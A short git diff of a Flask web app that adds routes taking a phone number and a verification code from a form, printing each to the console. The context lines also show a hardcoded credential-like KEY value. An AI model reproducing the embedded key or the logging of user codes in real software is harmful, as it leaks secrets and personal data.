@@ -3,13 +3,26 @@ from datetime import datetime
 import random
 from collections import defaultdict
 import time
-from flask import Flask, render_template
+from flask import Flask, render_template, request
 
 app = Flask(__name__)
 @app.route('/')
 def homepage():
-    return render_template('index.html')
+    return render_template('initial.html')
 
+@app.route('/send', methods=['GET', 'POST'])
+def parse_number():
+    number = request.form["number"]
+    print(number)
+   
+    return render_template('verify.html')
+
+@app.route("/submit", methods=['GET', 'POST'])
+def parse_code():
+    code = request.form["code"]
+    print(code)
+    return render_template('settings.html')
+    
 NUMBERS = {}
 
 KEY = 'AC14ae6ec84d5319ffbddba8458e574c37'
